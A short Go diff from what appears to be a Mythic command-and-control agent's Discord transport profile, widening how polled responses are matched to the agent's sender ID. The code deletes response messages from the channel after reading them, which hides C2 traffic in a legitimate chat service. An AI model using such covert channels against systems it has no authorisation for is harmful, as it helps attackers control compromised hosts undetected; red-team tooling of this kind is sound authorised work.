@@ -620,9 +620,11 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 				continue
 			}
 
-			// Match: to_server=false and sender_id matches (server echoes our sender_id back)
-			// or client_id matches our tracking ID
-			if !respWrapper.ToServer && (respWrapper.ClientID == clientID || respWrapper.SenderID == senderID) {
+			// Match: to_server=false and one of:
+			// - client_id matches our tracking ID (clientID)
+			// - sender_id matches us (senderID)
+			// - client_id matches our sender_id (server echoes sender_id as client_id)
+			if !respWrapper.ToServer && (respWrapper.ClientID == clientID || respWrapper.SenderID == senderID || respWrapper.ClientID == senderID) {
 				// Delete the response message from the channel after reading
 				d.deleteMessage(msg.ID, cfg)
 				return respWrapper.Message, nil
